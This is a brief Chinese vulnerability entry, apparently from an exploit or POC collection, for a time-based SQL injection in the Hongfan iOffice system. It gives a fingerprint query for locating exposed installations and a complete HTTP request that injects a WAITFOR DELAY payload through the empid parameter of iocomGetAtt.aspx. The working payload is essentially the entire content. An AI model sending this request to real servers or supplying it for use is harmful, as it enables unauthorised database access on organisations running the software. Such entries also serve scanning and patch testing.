# 红帆-ioffice-iocomGetAtt-mssql-delay-sql注入漏洞

红帆-ioffice-iocomGetAtt-mssql-delay ｜ SQL注入 ｜ —
- **指纹**：`app="红帆-ioffice"`
- **请求**：`GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1`